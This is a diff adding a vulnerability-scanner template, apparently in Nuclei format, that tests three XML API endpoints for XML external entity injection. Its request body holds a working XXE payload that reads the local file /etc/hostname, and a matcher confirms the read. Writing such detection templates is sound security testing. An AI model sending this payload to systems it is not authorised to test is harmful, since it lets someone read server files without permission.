@@ -1,0 +1,31 @@
+id: whai-xxe-file-read
+
+info:
+  name: XXE File Read
+  author: whitehat-ai
+  severity: critical
+  description: Tests XML endpoints for XXE local file read
+  tags: xxe,injection,file-read,critical
+  classification:
+    cwe-id: CWE-611
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/xml"
+      - "{{BaseURL}}/api/upload"
+      - "{{BaseURL}}/api/import"
+
+    headers:
+      Content-Type: application/xml
+
+    body: |
+      <?xml version="1.0"?>
+      <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
+      <root><data>&xxe;</data></root>
+
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "^[a-zA-Z0-9_-]+$"
